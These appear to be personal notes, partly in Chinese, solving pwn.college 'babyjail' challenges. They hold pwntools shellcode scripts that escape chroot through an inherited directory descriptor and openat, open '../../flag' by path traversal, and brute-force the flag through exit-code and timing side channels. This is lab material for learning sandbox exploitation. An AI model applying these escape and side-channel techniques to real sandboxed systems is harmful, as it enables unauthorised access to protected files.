字符串在栈中
str="123456789"

mov rbx,0x3837363534333231
push 0x39
push rbx

esp:31 32 33 34 35 36 37 38
	39

.level2
mov rbx,0x6c662f2e2e2f2e2e
push 0x6761
push rbx
mov rax,2
mov rdi,rsp
mov rsi,0
syscall

.level3
context.log_level='DEBUG'
context.arch='amd64'
#../../../flag
p=process(["/challenge/babyjail_level3","/"])

#payload=asm(shellcode,arch='amd64')
#p.send(payload)
p.send(asm(f'''
{shellcraft.pushstr("flag")}
mov rsi,rsp
{shellcraft.openat(3,"rsi",0)}

{shellcraft.sendfile(1,4,0,1024)}
'''))

p.interactive()

.绕过chroot(),chdir()，利用带目录描述符的函数,前提条件是程序运行前打开了目录
1.
	openat(3,"flag",0)

.level10
//侧信道爆破
for i in range(60):
    p=process(["/challenge/babyjail_level10","/flag"])
#payload=asm(shellcode,arch='amd64')
#p.send(payload)
    p.send(asm(f'''

    {shellcraft.read(3,"rsp",60)}
    xor bl,bl
    mov bl,31
    A:
    add bl,1
    mov al,[rsp+%s]
    cmp al,bl
    jz E
    jmp A
    E:
    {shellcraft.exit("al")}
    '''%(i)))

    p.interactive()

.level 11
nanosleep asm
'''
push 0
push 1
mov rdi,rsp
mov rax,SYS_nanosleep
syscall
'''
from pwn import *
import time

iteration=log.progress("PROGRESS")
flag_progess=log.progress("FLAG")
flag=b""
context.arch='amd64'
for i in range(0,60):
    for b in range(32,126):
        iteration.status(f"Iteration {i},Byte {b}")

        start=time.time()

        with process(["/challenge/babyjail_level11","/flag"],level="CRITICAL") as target:
            target.send(asm(f"""
            sub rsp,0x1000
            {shellcraft.read(3,"rsp",100)}
            xor rax,rax
            mov al,[rsp+%s]

            cmp rax,{b}
            jne crash

            sleep:
            lea rdi,[rip+time]
            mov rax,SYS_nanosleep
            syscall

            crash:

            time:
            .8byte 2
            .8byte 0
            """%(i)))

            target.poll(True)

        end=time.time()
        if(end-start >2):
            flag+=bytes([b])
            flag_progess.status(repr(flag))
            break

